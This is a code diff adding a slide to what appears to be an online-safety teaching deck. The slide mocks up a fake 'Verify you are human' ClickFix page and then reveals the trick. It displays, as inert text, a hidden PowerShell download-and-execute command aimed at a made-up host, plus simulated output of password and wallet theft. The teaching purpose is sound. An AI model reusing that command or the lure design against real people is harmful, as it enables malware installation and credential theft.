@@ -5,6 +5,10 @@
      'scam-roblox-email'   email (desktop mail app): Roblox account "will be deleted", free Robux bait, link goes elsewhere
      'scam-whatsapp-code'  WhatsApp: a friend's stolen account asks for the 6-digit code that just arrived
      'scam-netflix-email'  email (desktop mail app): membership on hold, update your card, perfect English
+     'scam-fake-captcha'   website (Windows + browser): a fake "Verify you are human" check (ClickFix). Plays out the attack:
+                           first 4 clicks play the visitor's part (tick the box, Win+R, Ctrl+V, Enter: "Verified"), then
+                           5 clicks reveal what went wrong: the jobs, the hidden clipboard command, the Run box, its hidden
+                           start, and the PowerShell theft
    Each slide opens on the message alone and asks "would you ...?". Every click circles one warning sign on the screen
    (a numbered pin) and adds it to the "what to spot" list; the last one stamps SCAM and swaps the question for what to do
    instead. Back removes them again. The screens are HTML (crisp at any size), not pictures; all numbers, names, accounts
@@ -48,6 +52,65 @@ function mail(o) {
     '<span data-f="1">&lt;' + o.addr + '&gt;</span><small>to me</small></div><time>' + o.time + '</time></div>' +
     '<div class="mw-card"><div class="mw-bh" style="' + o.brandCss + '">' + o.brand + '</div><div class="mw-bd">' + o.body + '</div></div></div></div>';
 }
+
+/* ---------------------------------------------------------------- the fake "Verify you are human" page (ClickFix), drawn as a
+   Windows desktop: browser on the look-alike check page, taskbar, and the Run box / PowerShell / clipboard reveal on top.
+   Positions are px inside the 1020x880 screen (.pj-pc). Domain, ID and IP address are made up (203.0.113.x is reserved). */
+function cloud(c) { return '<svg viewBox="0 0 64 34"><g fill="' + c + '"><circle cx="21" cy="20" r="9"/><circle cx="34" cy="14" r="12"/><circle cx="48" cy="21" r="8"/><rect x="12" y="20" width="44" height="9" rx="4.5"/></g></svg>'; }
+var WIN = '<svg viewBox="0 0 20 20" fill="#0a74da"><rect x="1" y="1" width="8.3" height="8.3"/><rect x="10.7" y="1" width="8.3" height="8.3"/><rect x="1" y="10.7" width="8.3" height="8.3"/><rect x="10.7" y="10.7" width="8.3" height="8.3"/></svg>';
+var STROKE = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">';
+var NAV = STROKE + '<path d="M19 12H5M11 6l-6 6 6 6"/></svg>' + STROKE + '<path d="M5 12h14M13 6l6 6-6 6"/></svg>' + STROKE + '<path d="M20 12a8 8 0 1 1-2.4-5.7M20 4v5h-5"/></svg>';
+var TUNE = STROKE + '<path d="M4 8h9M17 8h3M4 16h3M11 16h9"/><circle cx="15" cy="8" r="2"/><circle cx="9" cy="16" r="2"/></svg>';
+var RUNIC = '<svg viewBox="0 0 40 40"><rect x="3" y="6" width="34" height="27" rx="2" fill="#fff" stroke="#5a6b80" stroke-width="2"/><rect x="4" y="7" width="32" height="5" fill="#3f8ae0"/><path d="M13 27l9-9M15 18h7v7" stroke="#2b8a3e" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+var DOMAIN = 'craftmods-hub.net', CFID = 'd3d28e7c13251934', BAD = 'powershell -w hidden -c "iwr craftmods-cdn.top/v | iex"';
+function ppRow(n, txt, keys) { return '<div class="pp-row pr' + n + '"><i class="pp-n">' + n + '</i><span>' + txt + '</span><em>' + keys + '</em></div>'; }
+var PS_LINES = [
+  'PS C:\\Users\\Sam&gt; <b>iwr craftmods-cdn.top/v | iex</b>',
+  'Downloading update.exe ............ done',
+  'Reading saved passwords ........ 38 found',
+  'Copying Roblox, Discord logins .... done',
+  'Looking for crypto wallets ...... 1 found',
+  '<em>Sending it all to 203.0.113.7 ..... sent</em>'
+];
+var WEB_HTML =
+  '<div class="pc-br">' +
+    '<div class="pc-tabs"><div class="pc-tab"><i class="fav">' + cloud('#f38020') + '</i><span>Just a moment...</span><b>&#x2715;</b></div><b class="pc-plus">+</b>' +
+      '<div class="pc-wc"><i>&#x2500;</i><i>&#x25A2;</i><i>&#x2715;</i></div></div>' +
+    '<div class="pc-tool">' + NAV + '<div class="pc-url">' + TUNE + '<span>' + DOMAIN + '</span></div><i class="pc-dots">&#x22EE;</i></div>' +
+    '<div class="pc-pg">' +
+      '<h1><i>' + cloud('#fff') + '</i>www.' + DOMAIN + '</h1>' +
+      '<p class="pc-sub">Verify you are human by completing the action below.</p>' +
+      '<div class="pc-cf"><i class="cf-bx"></i><i class="cf-sp"></i><span class="cf-t"><b>Verify you are human</b><b>Verifying&hellip;</b></span>' +
+        '<div class="cf-lg">' + cloud('#f38020') + '<b>CLOUDFLARE</b><small>Privacy &middot; Terms</small></div></div>' +
+      '<p class="pc-sec">www.' + DOMAIN + ' needs to review the security of your connection before proceeding.</p>' +
+      '<div class="pc-dim"></div>' +
+      '<div class="pc-pop">' +
+        '<div class="pp-hd"><div><b>Verifying you are human</b><small>This may take a few seconds</small></div><div class="pp-lg">' + cloud('#fff') + '<b>CLOUDFLARE</b></div></div>' +
+        '<div class="pp-bd"><div class="pp-h">Verification steps:</div><div class="pp-st" data-f="1" data-pin="">' +
+          ppRow(1, 'Press Win + R', '<kbd>' + WIN + '</kbd>+<kbd>R</kbd>') +
+          ppRow(2, 'Press Ctrl + V to paste the verification code', '<kbd>CTRL</kbd>+<kbd>V</kbd>') +
+          ppRow(3, 'Press Enter to confirm', '<kbd>ENTER</kbd><kbd>&#x21B5;</kbd>') +
+        '</div><div class="pp-ag">You will observe and agree:</div><div class="pp-code">I am not a robot - Cloudflare ID: ' + CFID + '</div></div>' +
+        '<div class="pp-ft"><span>Perform the steps above to complete verification</span><b class="pp-btn"><u>VERIFY</u><u>&#x2713; VERIFIED</u></b></div>' +
+      '</div>' +
+    '</div>' +
+  '</div>' +
+  '<div class="pc-task"><div class="tk-c"><i>' + WIN + '</i><i><svg viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2" stroke-linecap="round"><circle cx="10.5" cy="10.5" r="6.5"/><path d="M15.5 15.5 21 21"/></svg></i>' +
+    '<i><svg viewBox="0 0 24 24"><path d="M2 6a2 2 0 0 1 2-2h5l2 2h9a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2z" fill="#f4c13d"/></svg></i>' +
+    '<i class="on"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#1a73e8"/><path d="M2 12h20M12 2c3.5 3 3.5 17 0 20M12 2c-3.5 3-3.5 17 0 20" stroke="#fff" stroke-width="1.4" fill="none"/></svg></i></div>' +
+    '<div class="tk-r"><span>ENG</span><b>16:21</b></div></div>' +
+  '<div class="pc-ps abs" data-f="5"><div class="ps-tb"><i>&gt;_</i>Windows PowerShell<span>&#x2500; &#x25A2; &#x2715;</span></div><div class="ps-bd">' +
+    PS_LINES.map(function (l) { return '<div class="ps-l">' + l + '</div>'; }).join('') + '</div></div>' +
+  '<div class="pc-clip abs" data-f="2"><div class="cl-h">&#x1F4CB; What clicking the box secretly copied</div>' +
+    '<code><span class="bad">' + BAD.replace(/"/g, '&quot;') + '</span> <span class="ok"># I am not a robot - Cloudflare ID: ' + CFID + '</span></code>' +
+    '<div class="cl-n"><b>Red:</b> downloads and runs a hidden program. <span>Grey: all you get to see.</span></div></div>' +
+  '<div class="pc-run abs" data-f="3"><div class="rn-tb"><i>' + RUNIC + '</i>Run<b>&#x2715;</b></div>' +
+    '<div class="rn-bd"><i class="rn-ic">' + RUNIC + '</i><p>Type the name of a program, folder, document, or Internet resource, and Windows will open it for you.</p></div>' +
+    '<div class="rn-op"><span>Open:</span><div class="rn-in" data-f="4" data-pin="l"><div class="rn-sc"><span class="rn-tx">' + BAD.replace(/"/g, '&quot;') +
+      '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# I am not a robot - Cloudflare ID: ' + CFID + '</span><i class="rn-ca"></i></div></div></div>' +
+    '<div class="rn-bt"><b class="pri">OK</b><b>Cancel</b><b>Browse...</b></div></div>' +
+  '<div class="pc-kv"></div>' +
+  '<i class="pc-cur">' + CURSOR + '</i>';
 
 var SCAMS = [
   { id: 'scam-parcel-sms', title: 'Spot the scam: parcel text', kind: 'phone', chip: 'SMS',
@@ -142,7 +205,25 @@ var SCAMS = [
       ['Pay in 48 hours or lose it', 'The deadline is there to make you rush.'],
       ['A button that wants your card', 'Never type card details after clicking an email link.'],
       ['Perfect English', 'AI writes flawless scams now. Don&rsquo;t wait for spelling mistakes.']
-    ] }
+    ] },
+
+  { id: 'scam-fake-captcha', title: 'Spot the scam: fake “I’m human” check', kind: 'web', chip: 'Website', pre: 4,
+    ttl: 'Just prove you&rsquo;re <em>human</em>&hellip;', q: 'Would you do the 3 steps?',
+    ins: 'Close the page. Real checks never ask you to press keys. Already did it? Tell an adult straight away.',
+    html: WEB_HTML,
+    flags: [
+      ['A check that gives you <i class="hl">jobs</i>', 'A real &ldquo;I&rsquo;m not a robot&rdquo; check is one click. It never asks you to press keys.'],
+      ['It secretly copied a command', 'Clicking the box put a hidden command on your clipboard.'],
+      ['Win + R opens &ldquo;Run&rdquo;', 'Whatever you paste in there runs on your computer.'],
+      ['You only see the end', 'The dangerous part is pushed out of sight. You see &ldquo;I am not a robot&rdquo;.'],
+      ['Enter: you install it yourself', 'It runs hidden and steals saved passwords, game logins and more.']
+    ],
+    init: function (st, dev, ctx, k0) {
+      st.gen = 0; st.kv = dev.querySelector('.pc-kv'); st.lines = dev.querySelectorAll('.ps-l');
+      webScene(st, k0, false, ctx);
+      if (!k0) { st.r.classList.add('w-load'); ctx.timeout(function () { st.r.classList.remove('w-load'); }, 1600); }
+    },
+    scene: webScene }
 ];
 
 /* ---------------------------------------------------------------- styles */
@@ -152,11 +233,11 @@ addCss('pj-css', [
   '.pj *{box-sizing:border-box}',
   /* right-hand column: kicker, title, question / answer, the list of warning signs */
   '.pj-col{position:absolute;top:96px;left:850px;width:960px}',
-  '.pj.mail .pj-col{left:1110px;width:760px}',
+  '.pj.mail .pj-col,.pj.web .pj-col{left:1110px;width:760px}',
   '.pj-k{display:flex;gap:16px;align-items:center;font:700 20px/1 var(--f-body);letter-spacing:.2em;text-transform:uppercase;color:#ff8a8a}',
   '.pj-k span{letter-spacing:.04em;text-transform:none;padding:8px 18px;border-radius:99px;background:rgba(255,255,255,.08);color:#fff;box-shadow:inset 0 0 0 1.5px rgba(255,255,255,.25)}',
   '.pj-t{margin-top:22px;font:600 68px/1.05 var(--f-display);letter-spacing:-.02em;color:#fff}',
-  '.pj.mail .pj-t{font-size:60px}',
+  '.pj.mail .pj-t,.pj.web .pj-t{font-size:60px}',
   '.pj-t em{font-style:italic;color:#ff6b6b}',
   '.pj-q{display:grid;margin-top:26px}',
   '.pj-q>*{grid-area:1/1;align-self:start;transition:opacity .5s,transform .5s var(--ease)}',
@@ -166,7 +247,7 @@ addCss('pj-css', [
   '.pj.done .pj-q .a{opacity:0;transform:translateY(-14px)}',
   '.pj.done .pj-q .b{opacity:1;transform:none}',
   '.pj-fl{margin-top:30px;display:flex;flex-direction:column;gap:20px}',
-  '.pj.mail .pj-fl{gap:14px}',
+  '.pj.mail .pj-fl,.pj.web .pj-fl{gap:14px}',
   '.pj-f{display:grid;grid-template-columns:50px 1fr;gap:18px;align-items:start;opacity:0;transform:translateX(30px);transition:opacity .45s,transform .55s var(--ease)}',
   '.pj-f.on{opacity:1;transform:none}',
   '.pj-f .n{width:50px;height:50px;border-radius:50%;background:rgb(' + RED + ');color:#fff;font:800 25px/50px var(--f-body);text-align:center;box-shadow:0 0 0 6px rgba(' + RED + ',.18)}',
@@ -191,6 +272,7 @@ addCss('pj-css', [
   '.pj.done .pj-st{opacity:.95;transform:rotate(-14deg)}',
   '.pj.phone .pj-st{left:560px;top:850px}',
   '.pj.mail .pj-st{left:640px;top:830px}',
+  '.pj.web .pj-st{left:600px;top:800px}',
   /* phone */
   '.pj-ph{position:absolute;left:250px;top:58px;width:476px;height:968px;border-radius:72px;background:#0e0f12;padding:13px;box-shadow:0 0 0 2px #3a3b42,0 50px 100px rgba(0,0,0,.7)}',
   '.pj-ph .scr{position:relative;width:100%;height:100%;border-radius:60px;overflow:hidden;display:flex;flex-direction:column;background:#fff;color:#000}',
@@ -267,17 +349,118 @@ addCss('pj-css', [
   '.mw-tip{position:absolute;left:150px;top:56px;z-index:2;white-space:nowrap;padding:6px 12px;border-radius:6px;background:#fffbe6;border:1px solid #d8cfa0;box-shadow:0 4px 12px rgba(0,0,0,.18);font:400 16px/1.2 var(--f-mono);color:#333}'
 ]);
 
+/* the fake check page (kind 'web'). Overlays are written as '.pj .pc-x' so their transitions beat '.pj [data-f]'. */
+addCss('pj-web-css', [
+  '.pj .pj-pc{position:absolute;left:50px;top:110px;width:1020px;height:880px;border-radius:14px;overflow:hidden;background:#fff;color:#1f1f1f;',
+  '  box-shadow:0 0 0 1px rgba(255,255,255,.14),0 50px 100px rgba(0,0,0,.7)}',
+  '.pc-br{position:absolute;left:0;top:0;right:0;bottom:48px;display:flex;flex-direction:column}',
+  /* browser chrome */
+  '.pc-tabs{flex:none;position:relative;height:42px;display:flex;align-items:flex-end;gap:6px;padding-left:10px;background:#dfe3e8}',
+  '.pc-tab{width:250px;height:34px;display:flex;align-items:center;gap:9px;padding:0 12px;border-radius:10px 10px 0 0;background:#fff;font:400 14px/1 var(--f-body);color:#222}',
+  '.pc-tab .fav{width:20px;flex:none}.pc-tab .fav svg{width:20px;display:block}.pc-tab span{flex:1}.pc-tab b{font:400 12px/1 var(--f-body);color:#555}',
+  '.pc-plus{align-self:center;margin-left:6px;font:300 24px/1 var(--f-body);color:#444}',
+  '.pc-wc{position:absolute;right:0;top:0;height:42px;display:flex}.pc-wc i{width:54px;display:grid;place-items:center;font:400 14px/1 var(--f-body);font-style:normal;color:#333}',
+  '.pc-tool{flex:none;height:48px;display:flex;align-items:center;gap:16px;padding:0 14px;background:#fff;border-bottom:1px solid #e3e3e3;color:#5f6368}',
+  '.pc-tool>svg{width:20px;height:20px;flex:none}',
+  '.pc-url{flex:1;height:34px;display:flex;align-items:center;gap:12px;padding:0 16px;border-radius:17px;background:#eef1f4;font:400 16px/1 var(--f-body);color:#202124}',
+  '.pc-url svg{width:18px;height:18px;color:#5f6368}.pc-dots{font:700 20px/1 var(--f-body);font-style:normal}',
+  /* the look-alike check page */
+  '.pc-pg{flex:1;position:relative;background:#fff}',
+  '.pc-pg h1{position:absolute;left:50px;top:40px;margin:0;display:flex;align-items:center;gap:20px;font:600 46px/1 var(--f-body);letter-spacing:-.01em;color:#222}',
+  '.pc-pg h1 i{width:58px;height:58px;border-radius:10px;background:#d9531e;display:grid;place-items:center}.pc-pg h1 svg{width:44px}',
+  '.pc-sub,.pc-sec{position:absolute;left:50px;right:50px;margin:0;font:400 23px/1.35 var(--f-body);color:#3a3a3a}',
+  '.pc-sub{top:122px}.pc-sec{top:290px}',
+  '.pc-cf{position:absolute;left:50px;top:178px;width:330px;height:68px;border:1px solid #d6d6d6;border-radius:4px;background:#fafafa}',
+  '.cf-bx{position:absolute;left:18px;top:20px;width:26px;height:26px;border:2px solid #666;border-radius:4px;background:#fff;transition:opacity .2s}',
+  '.cf-sp{position:absolute;left:17px;top:19px;width:28px;height:28px;border:3px solid #cfe9d8;border-top-color:#1a8f4a;border-radius:50%;opacity:0;animation:pc-spin .8s linear infinite}',
+  '@keyframes pc-spin{to{transform:rotate(360deg)}}',
+  '.pj.w-load .cf-bx,.pj.a2 .cf-bx{opacity:0}.pj.w-load .cf-sp,.pj.a2 .cf-sp{opacity:1}',
+  '.cf-t{position:absolute;left:58px;top:0;font:400 16px/68px var(--f-body);color:#222}.cf-t b{font-weight:400}.cf-t b+b,.pj.w-load .cf-t b{display:none}.pj.w-load .cf-t b+b{display:inline}',
+  '.cf-lg{position:absolute;right:12px;top:9px;display:flex;flex-direction:column;align-items:center}.cf-lg svg{width:42px;display:block}',
+  '.cf-lg b{font:800 10px/1 var(--f-body);letter-spacing:.08em;color:#404040}.cf-lg small{margin-top:3px;font:400 9px/1 var(--f-body);color:#555;text-decoration:underline}',
+  /* the popup that asks for the key presses */
+  '.pc-dim{position:absolute;inset:0;background:rgba(70,70,70,.58);opacity:0;transition:opacity .5s}.pj.a3 .pc-dim{opacity:1}',
+  '.pj .pc-pop{position:absolute;right:28px;top:22px;width:492px;border-radius:10px;background:#fff;box-shadow:0 20px 50px rgba(0,0,0,.4);',
+  '  opacity:0;transform:translateY(26px) scale(.97);transition:opacity .45s,transform .6s var(--ease)}',
+  '.pj.a3 .pc-pop{opacity:1;transform:none}',
+  '.pp-hd{display:flex;justify-content:space-between;align-items:center;padding:20px 26px;border-radius:10px 10px 0 0;background:linear-gradient(90deg,#f3801f,#f8a23d);color:#fff}',
+  '.pp-hd b{display:block;font:700 25px/1.2 var(--f-body)}.pp-hd small{display:block;margin-top:4px;font:400 16px/1.2 var(--f-body)}',
+  '.pp-lg{display:flex;flex-direction:column;align-items:center}.pp-lg svg{width:42px;display:block}.pp-lg b{font:800 9px/1 var(--f-body);letter-spacing:.08em;color:#6b3300}',
+  '.pp-bd{padding:22px 28px}.pp-h{margin-bottom:16px;font:600 20px/1 var(--f-body);color:#222}',
+  '.pj .pp-st{display:flex;flex-direction:column;gap:6px;padding:2px 0 2px 14px;border-left:3px solid #f3801f}',
+  '.pp-row{display:flex;align-items:center;gap:14px;padding:8px 10px;border-radius:8px;transition:background .3s}',
+  '.pp-n{width:28px;height:28px;flex:none;border-radius:50%;background:#f6a821;color:#fff;font:700 15px/28px var(--f-body);font-style:normal;text-align:center;transition:background .3s}',
+  '.pp-row span{flex:1;font:400 18px/1.25 var(--f-body);color:#222}',
+  '.pp-row em{display:flex;align-items:center;gap:4px;font:400 13px/1 var(--f-body);font-style:normal;color:#999}',
+  '.pp-row kbd{min-width:32px;height:30px;padding:0 7px;display:grid;place-items:center;border:1px solid #cfcfcf;border-radius:4px;background:#f6f6f6;font:500 14px/1 var(--f-body);color:#333}',
+  '.pp-row kbd svg{width:16px;height:16px}',
+  '.pj.r1 .pr1,.pj.r2 .pr2,.pj.r3 .pr3{background:#fff1d6}.pj.r1 .pr1 .pp-n,.pj.r2 .pr2 .pp-n,.pj.r3 .pr3 .pp-n{background:#2e9e5b}',
+  '.pp-ag{margin:18px 0 10px;font:400 17px/1 var(--f-body);color:#555}',
+  '.pp-code{padding:12px 18px;border-left:3px solid #f3801f;border-radius:4px;background:#f1f1f1;font:400 15px/1.45 var(--f-mono);color:#333}',
+  '.pp-ft{display:flex;align-items:center;justify-content:space-between;gap:20px;padding:18px 28px;border-radius:0 0 10px 10px;background:#f6f6f6;border-top:1px solid #eee}',
+  '.pp-ft>span{font:400 15px/1.3 var(--f-body);color:#666}',
+  '.pp-btn{flex:none;padding:13px 24px;border-radius:5px;background:#dcdcdc;color:#8a8a8a;font:700 17px/1 var(--f-body);letter-spacing:.04em;transition:background .3s,color .3s}',
+  '.pp-btn u{text-decoration:none}.pp-btn u+u,.pj.ver .pp-btn u{display:none}.pj.ver .pp-btn u+u{display:inline}.pj.ver .pp-btn{background:#2e9e5b;color:#fff}',
+  /* Windows taskbar */
+  '.pc-task{position:absolute;left:0;right:0;bottom:0;height:48px;display:flex;align-items:center;justify-content:center;background:#e9eef5;border-top:1px solid #d5dbe3}',
+  '.tk-c{display:flex;gap:10px}.tk-c i{width:38px;height:38px;border-radius:6px;display:grid;place-items:center}.tk-c i svg{width:22px;height:22px}.tk-c i.on{background:#fff}',
+  '.tk-r{position:absolute;right:18px;top:0;height:48px;display:flex;align-items:center;gap:16px;font:400 13px/1 var(--f-body);color:#222}.tk-r b{font-weight:400}',
+  /* Run box */
+  '.pj .pc-run{position:absolute;left:14px;top:604px;width:462px;z-index:5;border-radius:8px;background:#f3f3f3;box-shadow:0 0 0 1px rgba(0,0,0,.25),0 18px 44px rgba(0,0,0,.45);',
+  '  opacity:0;transform:translateY(22px) scale(.98);transition:opacity .35s,transform .45s var(--ease),box-shadow .4s}',
+  '.pj.run .pc-run{opacity:1;transform:none}',
+  '.rn-tb{display:flex;align-items:center;gap:10px;height:36px;padding-left:14px;font:400 14px/1 var(--f-body);color:#222}.rn-tb i svg{width:16px;height:16px;display:block}',
+  '.rn-tb b{margin-left:auto;width:46px;text-align:center;font-weight:400;color:#333}',
+  '.rn-bd{display:flex;gap:16px;padding:10px 22px 6px}.rn-ic svg{width:40px;height:40px}.rn-bd p{margin:0;font:400 15px/1.4 var(--f-body);color:#222}',
+  '.rn-op{display:flex;align-items:center;gap:14px;padding:10px 22px}.rn-op>span{font:400 15px/1 var(--f-body);color:#222}',
+  '.rn-in{flex:1;height:34px;border:1px solid #8a8a8a;border-bottom:2px solid #005fb8;border-radius:4px;background:#fff}',
+  '.rn-sc{position:absolute;top:0;bottom:0;left:8px;right:8px;display:flex;align-items:center;overflow:hidden;white-space:nowrap;font:400 15px/1 var(--f-body);color:#111}',
+  '.rn-tx{display:none;flex:none}.pj.paste .rn-tx{display:inline}.pj.paste .rn-sc{justify-content:flex-end}',
+  '.rn-ca{flex:none;width:1.5px;height:20px;background:#111;animation:pc-blink 1s steps(1) infinite}@keyframes pc-blink{50%{opacity:0}}',
+  '.rn-bt{display:flex;justify-content:flex-end;gap:8px;margin-top:6px;padding:12px 18px 16px;border-radius:0 0 8px 8px;background:#ebebeb}',
+  '.rn-bt b{width:96px;height:32px;border:1px solid #c9c9c9;border-radius:4px;background:#fdfdfd;font:400 14px/30px var(--f-body);text-align:center;color:#222}',
+  '.rn-bt b.pri{background:#005fb8;border-color:#005fb8;color:#fff}',
+  /* PowerShell (really hidden; shown here so we can see what it does) */
+  '.pj .pc-ps{position:absolute;left:16px;top:112px;width:462px;z-index:6;border-radius:8px;background:#012456;box-shadow:0 0 0 1px rgba(255,255,255,.2),0 20px 50px rgba(0,0,0,.55);',
+  '  opacity:0;transform:scale(.96);transition:opacity .3s,transform .4s var(--ease),box-shadow .4s}',
+  '.pj.ent .pc-ps{opacity:1;transform:none}',
+  '.ps-tb{display:flex;align-items:center;gap:10px;height:34px;padding:0 14px;border-radius:8px 8px 0 0;background:#1f1f1f;font:400 14px/1 var(--f-body);color:#ddd}',
+  '.ps-tb i{font:700 13px/1 var(--f-mono);font-style:normal;color:#5ab0ff}.ps-tb span{margin-left:auto;color:#aaa;letter-spacing:.2em}',
+  '.ps-bd{min-height:230px;padding:14px 16px 18px}',
+  '.ps-l{font:400 14px/1.75 var(--f-mono);color:#eee;white-space:pre;opacity:0;transition:opacity .2s}.ps-l.on{opacity:1}',
+  '.ps-l b{font-weight:400;color:#ffd75e}.ps-l em{font-style:normal;font-weight:700;color:#ff6b6b}',
+  /* clipboard reveal */
+  '.pj .pc-clip{position:absolute;left:16px;top:398px;width:462px;z-index:4;padding:16px 18px 14px;border-radius:12px;background:#15171c;color:#eee;',
+  '  box-shadow:0 0 0 1px rgba(255,255,255,.18),0 18px 44px rgba(0,0,0,.5);opacity:0;transform:translateY(18px);transition:opacity .4s,transform .5s var(--ease),box-shadow .4s}',
+  '.pj.clip .pc-clip{opacity:1;transform:none}',
+  '.cl-h{margin-bottom:12px;font:700 15px/1 var(--f-body);letter-spacing:.1em;text-transform:uppercase;color:#ffc46b}',
+  '.pc-clip code{display:block;font:400 17px/1.45 var(--f-mono);word-break:break-all}.pc-clip .bad{font-weight:700;color:#ff6b6b}.pc-clip .ok{color:#8b919c}',
+  '.cl-n{margin-top:10px;font:400 16px/1.3 var(--f-body);color:#bbb}.cl-n b{color:#ff8a8a}',
+  /* keys being pressed */
+  '.pc-kv{position:absolute;left:500px;top:712px;width:492px;height:84px;z-index:7;display:flex;justify-content:center;align-items:center;gap:14px;pointer-events:none;',
+  '  opacity:0;transform:translateY(12px) scale(.9);transition:opacity .25s,transform .35s cubic-bezier(.3,1.5,.5,1)}',
+  '.pc-kv.on{opacity:1;transform:none}',
+  '.pc-kv kbd{min-width:76px;height:64px;padding:0 18px;display:grid;place-items:center;border-radius:12px;background:linear-gradient(#fff,#e4e6ec);color:#222;font:700 26px/1 var(--f-body);',
+  '  box-shadow:0 6px 0 #8d909a,0 12px 24px rgba(0,0,0,.5);transition:transform .12s,box-shadow .12s}',
+  '.pc-kv kbd svg{width:30px;height:30px}.pc-kv.dn kbd{transform:translateY(5px);box-shadow:0 1px 0 #8d909a,0 6px 14px rgba(0,0,0,.5)}',
+  '.pc-kv i{font:700 30px/1 var(--f-body);font-style:normal;color:#fff;text-shadow:0 2px 6px rgba(0,0,0,.6)}',
+  /* mouse pointer: tip lands on the checkbox */
+  '.pc-cur{position:absolute;left:0;top:0;width:30px;height:30px;z-index:9;transform:translate(600px,640px);transition:transform 1s cubic-bezier(.45,0,.2,1),opacity .3s}',
+  '.pc-cur svg{width:30px;height:30px;display:block;transition:transform .12s}',
+  '.pj.a1 .pc-cur{transform:translate(76px,298px)}.pj.a2 .pc-cur svg{transform:scale(.85)}.pj.a3 .pc-cur svg{transform:none}.pj.nocur .pc-cur{opacity:0}'
+]);
+
 /* ---------------------------------------------------------------- slides */
 var prev = 'wa-privacy';
 SCAMS.forEach(function (s, idx) {
-  var N = s.flags.length;
+  var N = s.flags.length, P = s.pre || 0;   /* P: clicks that play out the scene before the first warning sign */
   Deck.insertSlide({
     after: prev, id: s.id, title: s.title, section: 'protect', tr: { type: 'fade', ms: 800 }, loop: false, calm: true,
-    steps: N,
+    steps: P + N,
     render: function (el, ctx) {
       var r = h('div', 'pj ' + s.kind, el), dev;
       if (s.kind === 'phone') { dev = h('div', 'pj-ph', r); var scr = h('div', 'scr ' + s.scr, dev, s.html); h('div', 'isl', scr); }
-      else dev = h('div', 'pj-mw', r, s.html);
+      else dev = h('div', s.kind === 'web' ? 'pj-pc' : 'pj-mw', r, s.html);
       var col = h('div', 'pj-col', r,
         '<div class="pj-k">Spot the scam &middot; ' + (idx + 1) + '/' + SCAMS.length + '<span>' + s.chip + '</span></div>' +
         '<div class="pj-t">' + s.ttl + '</div>' +
@@ -292,10 +475,17 @@ SCAMS.forEach(function (s, idx) {
         h('i', 'pj-pin ' + (at.getAttribute('data-pin') || ''), at, String(i + 1));
       });
       h('div', 'pj-st', r, 'SCAM');
-      show(st, ctx.static ? N : 0);
+      var k0 = ctx.static ? P + N : 0;
+      show(st, k0 - P);
+      if (s.init) s.init(st, dev, ctx, k0);
     },
-    step: function (el, i) { if (el.__pj) show(el.__pj, i); },
-    unstep: function (el, i) { if (el.__pj) show(el.__pj, i - 1); }
+    /* s.scene(st, k, animate, ctx): extra per-slide states; animate only on a real forward click (not when the engine
+       replays every step at once on arriving backwards: then ctx.step is still 0) */
+    step: function (el, i, ctx) {
+      var st = el.__pj; if (!st) return; show(st, i - P);
+      if (s.scene) s.scene(st, i, !ctx.static && !ctx.reduced && ctx.step === i - 1, ctx);
+    },
+    unstep: function (el, i, ctx) { var st = el.__pj; if (!st) return; show(st, i - 1 - P); if (s.scene) s.scene(st, i - 1, false, ctx); }
   });
   prev = s.id;
 });
@@ -307,5 +497,46 @@ function show(st, k) {
     Array.prototype.forEach.call(st.hits[i], function (n) { n.classList.toggle('hit', i < k); });
   });
   st.r.classList.toggle('done', k >= st.items.length);
+}
+
+/* fake-check slide, state after k clicks. First what the visitor does (no warning signs yet):
+     1 box clicked, popup asks for the keys   2 Win+R: Run box opens   3 Ctrl+V: pasted   4 Enter: Run box closes, page says Verified
+   then what really happened (pre = 4, so click 4+n circles warning sign n):
+     5 the popup's "jobs"   6 the clipboard is revealed   7 the Run box again   8 its hidden start   9 PowerShell steals, SCAM
+   animate: play the click as it happens (pointer, key presses, typing). */
+function webOn(k) {
+  return { a1: k >= 1, a2: k >= 1, a3: k >= 1, nocur: k >= 2, r1: k >= 2, r2: k >= 3, r3: k >= 4, paste: k >= 3, ver: k >= 4,
+    run: (k >= 2 && k < 4) || k >= 7, clip: k >= 6, ent: k >= 9 };
+}
+function webScene(st, k, animate, ctx) {
+  var r = st.r, g = ++st.gen;
+  function at(ms, fn) { ctx.timeout(function () { if (g === st.gen) fn(); }, ms); }
+  function cls(c, on) { return function () { r.classList.toggle(c, on !== false); }; }
+  function set(n) {
+    var on = webOn(n);
+    for (var c in on) r.classList.toggle(c, on[c]);
+    Array.prototype.forEach.call(st.lines, function (l) { l.classList.toggle('on', n >= 9); });
+    st.kv.className = 'pc-kv';
+    if (n) r.classList.remove('w-load');
+  }
+  function keys(list) {
+    st.kv.innerHTML = list.map(function (x) { return '<kbd>' + x + '</kbd>'; }).join('<i>+</i>');
+    st.kv.classList.add('on');
+    at(250, function () { st.kv.classList.add('dn'); }); at(520, function () { st.kv.classList.remove('dn'); });
+    at(2000, function () { st.kv.classList.remove('on'); });
+  }
+  if (!animate) { set(k); return; }
+  set(k - 1);
+  if (k === 1) { cls('a1')(); at(1000, cls('a2')); at(1800, cls('a3')); }
+  else if (k === 2) { cls('nocur')(); keys([WIN, 'R']); at(400, function () { cls('run')(); cls('r1')(); }); }
+  else if (k === 3) { keys(['Ctrl', 'V']); at(400, function () { cls('paste')(); cls('r2')(); }); }
+  else if (k === 4) { keys(['Enter &#x21B5;']); at(400, function () { cls('run', false)(); cls('r3')(); }); at(1100, cls('ver')); }
+  else if (k === 9) {
+    r.classList.remove('done');                       /* the stamp waits until the theft has played out */
+    cls('ent')();
+    Array.prototype.forEach.call(st.lines, function (l, i) { at(300 + i * 330, function () { l.classList.add('on'); }); });
+    at(300 + st.lines.length * 330 + 150, cls('done'));
+  }
+  else set(k);
 }
 })();
